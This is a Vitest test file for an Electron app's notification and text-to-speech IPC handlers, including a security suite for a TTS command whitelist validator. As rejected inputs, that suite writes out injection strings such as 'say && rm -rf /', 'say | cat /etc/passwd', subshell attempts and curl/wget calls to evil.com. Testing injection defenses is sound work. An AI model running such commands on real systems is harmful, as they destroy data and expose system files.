/**
 * Tests for notification IPC handlers
 *
 * Note: TTS-related tests are simplified due to the complexity of mocking
 * child_process spawn with all the event listeners and stdin handling.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { ipcMain } from 'electron';

// Create hoisted mocks for more reliable mocking
const mocks = vi.hoisted(() => ({
	mockNotificationShow: vi.fn(),
	mockNotificationIsSupported: vi.fn().mockReturnValue(true),
}));

// Mock electron with a proper class for Notification
vi.mock('electron', () => {
	// Create a proper class for Notification
	class MockNotification {
		constructor(_options: { title: string; body: string; silent?: boolean }) {
			// Store options if needed for assertions
		}
		show() {
			mocks.mockNotificationShow();
		}
		static isSupported() {
			return mocks.mockNotificationIsSupported();
		}
	}

	return {
		ipcMain: {
			handle: vi.fn(),
		},
		Notification: MockNotification,
		BrowserWindow: {
			getAllWindows: vi.fn().mockReturnValue([]),
		},
	};
});

// Mock logger
vi.mock('../../../../main/utils/logger', () => ({
	logger: {
		info: vi.fn(),
		debug: vi.fn(),
		warn: vi.fn(),
		error: vi.fn(),
	},
}));

// Mock child_process - must include default export
vi.mock('child_process', async (importOriginal) => {
	const actual = await importOriginal<typeof import('child_process')>();

	const mockProcess = {
		stdin: {
			write: vi.fn((_data: string, _encoding: string, cb?: () => void) => {
				if (cb) cb();
			}),
			end: vi.fn(),
			on: vi.fn(),
		},
		stderr: {
			on: vi.fn(),
		},
		on: vi.fn(),
		kill: vi.fn(),
	};

	const mockSpawn = vi.fn(() => mockProcess);

	return {
		...actual,
		default: {
			...actual,
			spawn: mockSpawn,
		},
		spawn: mockSpawn,
	};
});

import {
	registerNotificationsHandlers,
	resetTtsState,
	getTtsQueueLength,
	getActiveTtsCount,
	clearTtsQueue,
	getTtsMaxQueueSize,
	getAllowedTtsCommands,
	validateTtsCommand,
} from '../../../../main/ipc/handlers/notifications';

describe('Notification IPC Handlers', () => {
	let handlers: Map<string, Function>;

	beforeEach(() => {
		vi.clearAllMocks();
		resetTtsState();
		handlers = new Map();

		// Reset mocks
		mocks.mockNotificationIsSupported.mockReturnValue(true);
		mocks.mockNotificationShow.mockClear();

		// Capture registered handlers
		vi.mocked(ipcMain.handle).mockImplementation((channel: string, handler: Function) => {
			handlers.set(channel, handler);
		});

		registerNotificationsHandlers();
	});

	afterEach(() => {
		vi.clearAllMocks();
		resetTtsState();
	});

	describe('handler registration', () => {
		it('should register all notification handlers', () => {
			expect(handlers.has('notification:show')).toBe(true);
			expect(handlers.has('notification:speak')).toBe(true);
			expect(handlers.has('notification:stopSpeak')).toBe(true);
		});
	});

	describe('notification:show', () => {
		it('should show OS notification when supported', async () => {
			mocks.mockNotificationIsSupported.mockReturnValue(true);

			const handler = handlers.get('notification:show')!;
			const result = await handler({}, 'Test Title', 'Test Body');

			expect(result.success).toBe(true);
			expect(mocks.mockNotificationShow).toHaveBeenCalled();
		});

		it('should return error when notifications not supported', async () => {
			mocks.mockNotificationIsSupported.mockReturnValue(false);

			const handler = handlers.get('notification:show')!;
			const result = await handler({}, 'Test Title', 'Test Body');

			expect(result.success).toBe(false);
			expect(result.error).toBe('Notifications not supported');
		});

		it('should handle empty strings', async () => {
			const handler = handlers.get('notification:show')!;
			const result = await handler({}, '', '');

			expect(result.success).toBe(true);
			expect(mocks.mockNotificationShow).toHaveBeenCalled();
		});

		it('should handle special characters', async () => {
			const handler = handlers.get('notification:show')!;
			const result = await handler({}, 'Title with "quotes"', "Body with 'apostrophes' & symbols");

			expect(result.success).toBe(true);
		});

		it('should handle unicode', async () => {
			const handler = handlers.get('notification:show')!;
			const result = await handler({}, '通知タイトル', '通知本文 🎉');

			expect(result.success).toBe(true);
		});

		it('should handle exceptions gracefully', async () => {
			// Make mockNotificationShow throw an error
			mocks.mockNotificationShow.mockImplementation(() => {
				throw new Error('Notification failed');
			});

			const handler = handlers.get('notification:show')!;
			const result = await handler({}, 'Test Title', 'Test Body');

			expect(result.success).toBe(false);
			expect(result.error).toBe('Error: Notification failed');
		});
	});

	describe('notification:stopSpeak', () => {
		it('should return error when no active TTS process', async () => {
			const handler = handlers.get('notification:stopSpeak')!;
			const result = await handler({}, 999);

			expect(result.success).toBe(false);
			expect(result.error).toBe('No active TTS process with that ID');
		});
	});

	describe('TTS state utilities', () => {
		it('should track TTS queue length', () => {
			expect(getTtsQueueLength()).toBe(0);
		});

		it('should track active TTS count', () => {
			expect(getActiveTtsCount()).toBe(0);
		});

		it('should clear TTS queue', () => {
			clearTtsQueue();
			expect(getTtsQueueLength()).toBe(0);
		});

		it('should reset TTS state', () => {
			resetTtsState();
			expect(getTtsQueueLength()).toBe(0);
			expect(getActiveTtsCount()).toBe(0);
		});

		it('should return max queue size', () => {
			expect(getTtsMaxQueueSize()).toBe(10);
		});

		it('should return allowed TTS commands', () => {
			const commands = getAllowedTtsCommands();
			expect(commands).toContain('say');
			expect(commands).toContain('espeak');
			expect(commands).toContain('espeak-ng');
			expect(commands).toContain('spd-say');
			expect(commands).toContain('festival');
			expect(commands).toContain('flite');
		});
	});

	describe('TTS command validation (security)', () => {
		it('should accept default command when none provided', () => {
			const result = validateTtsCommand();
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});

		it('should accept empty string and use default', () => {
			const result = validateTtsCommand('');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});

		it('should accept whitespace-only string and use default', () => {
			const result = validateTtsCommand('   ');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});

		it('should accept whitelisted command: say', () => {
			const result = validateTtsCommand('say');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});

		it('should accept whitelisted command: espeak', () => {
			const result = validateTtsCommand('espeak');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('espeak');
		});

		it('should accept whitelisted command: espeak-ng', () => {
			const result = validateTtsCommand('espeak-ng');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('espeak-ng');
		});

		it('should accept whitelisted command: spd-say', () => {
			const result = validateTtsCommand('spd-say');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('spd-say');
		});

		it('should accept whitelisted command: festival', () => {
			const result = validateTtsCommand('festival');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('festival');
		});

		it('should accept whitelisted command: flite', () => {
			const result = validateTtsCommand('flite');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('flite');
		});

		it('should reject non-whitelisted command', () => {
			const result = validateTtsCommand('rm');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
			expect(result.error).toContain('rm');
		});

		it('should reject command injection attempt with &&', () => {
			const result = validateTtsCommand('say && rm -rf /');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('arguments are not allowed');
		});

		it('should reject command injection attempt with ;', () => {
			const result = validateTtsCommand('say; rm -rf /');
			expect(result.valid).toBe(false);
			// The semicolon makes 'say;' the base command, which is not whitelisted
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should reject command injection attempt with |', () => {
			const result = validateTtsCommand('say | cat /etc/passwd');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('arguments are not allowed');
		});

		it('should reject command with arguments (security)', () => {
			const result = validateTtsCommand('say -v Alex');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('arguments are not allowed');
		});

		it('should reject command with subshell attempt', () => {
			const result = validateTtsCommand('$(whoami)');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should reject command with backtick attempt', () => {
			const result = validateTtsCommand('`whoami`');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should reject arbitrary shell command', () => {
			const result = validateTtsCommand('/bin/bash -c "echo hacked"');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should reject curl command', () => {
			const result = validateTtsCommand('curl http://evil.com');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should reject wget command', () => {
			const result = validateTtsCommand('wget http://evil.com');
			expect(result.valid).toBe(false);
			expect(result.error).toContain('Invalid TTS command');
		});

		it('should handle command with leading whitespace', () => {
			const result = validateTtsCommand('  say');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});

		it('should handle command with trailing whitespace', () => {
			// Trailing whitespace is trimmed, so 'say  ' becomes 'say' which is valid
			const result = validateTtsCommand('say  ');
			expect(result.valid).toBe(true);
			expect(result.command).toBe('say');
		});
	});

	describe('TTS queue size limit', () => {
		it('should reject requests when queue is full', async () => {
			const handler = handlers.get('notification:speak')!;
			const maxSize = getTtsMaxQueueSize();

			// The flow is:
			// 1. First call: item added to queue, processNextTts() shifts it out to process
			// 2. executeTts() creates a spawn that never completes, so isTtsProcessing stays true
			// 3. Subsequent calls: items are added to queue but not processed (isTtsProcessing is true)
			// 4. Queue accumulates items 2 through maxSize (first one was shifted out)
			// 5. We need maxSize + 1 calls total to fill the queue to maxSize items

			// First call - this item gets shifted out of queue immediately for processing
			handler({}, 'Message 0');

			// Allow the async processNextTts to start (shifts item from queue)
			await new Promise((resolve) => setTimeout(resolve, 10));

			// Now isTtsProcessing is true, so subsequent items stay in queue
			// Add maxSize more items - this should fill the queue to maxSize
			for (let i = 1; i <= maxSize; i++) {
				handler({}, `Message ${i}`);
			}

			// Small delay to ensure all are queued
			await new Promise((resolve) => setTimeout(resolve, 10));

			// Verify queue is at capacity
			expect(getTtsQueueLength()).toBe(maxSize);

			// Now try to add one more - should be rejected immediately
			// This will resolve immediately with error because queue >= maxSize check triggers
			const result = await handler({}, 'One more message');

			expect(result.success).toBe(false);
			expect(result.error).toContain('queue is full');
			expect(result.error).toContain(`max ${maxSize}`);

			// Clean up - reset all TTS state including clearing the queue
			resetTtsState();
		});
	});
});
